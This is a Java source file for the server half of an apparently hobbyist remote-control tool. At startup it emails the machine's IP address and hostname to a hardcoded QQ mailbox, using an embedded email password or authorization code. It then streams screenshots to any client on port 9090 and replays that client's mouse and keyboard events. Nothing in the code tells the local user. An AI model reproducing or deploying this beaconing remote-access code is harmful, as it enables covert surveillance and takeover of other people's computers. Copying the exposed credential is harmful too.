package com.pibigstar.main;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.JOptionPane;
import com.pibigstar.thread.ActionEvent;
import com.pibigstar.thread.SendScreenThread;
import com.pibigstar.util.GetIp;
import com.pibigstar.util.SendEmail;

/**
 * 服务端，等待控制端的接入
 * @author pibigstar
 *
 */
public class Service {

	private  DataOutputStream dos;
	private  ObjectInputStream ois;
	private final static int port = 9090;

	public static void main(String[] args) throws IOException {
		new Service().startServer(port);
	}

	private void startServer(int port){
		try {
			@SuppressWarnings("resource")
			ServerSocket serverSocket = new ServerSocket(port);
			String ip = GetIp.getHostIp();
			String hostName = GetIp.getHostName();
			System.out.println("server started in:"+ip);
			SendEmail sendEmail = new SendEmail("741047261@qq.com","xtyclmslgccrbdgd");
			sendEmail.sendEmail("741047261@qq.com", "远程控制", "IP:"+ip+":"+port+"主机名:"+hostName);
			while (true) {
				//等待客户端的连接
				Socket socket = serverSocket.accept();
				//得到客户端的输出流
				dos = new DataOutputStream(socket.getOutputStream());
				ois = new ObjectInputStream(socket.getInputStream());
				//启动发送屏幕线程，将屏幕截图发送给客户端
				SendScreenThread screenThread = new SendScreenThread(dos);
				screenThread.start();
				//启动事件监听线程，将对方发送的事件操作在服务端重现一遍
				ActionEvent actionEvent = new ActionEvent(ois);
				actionEvent.start();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
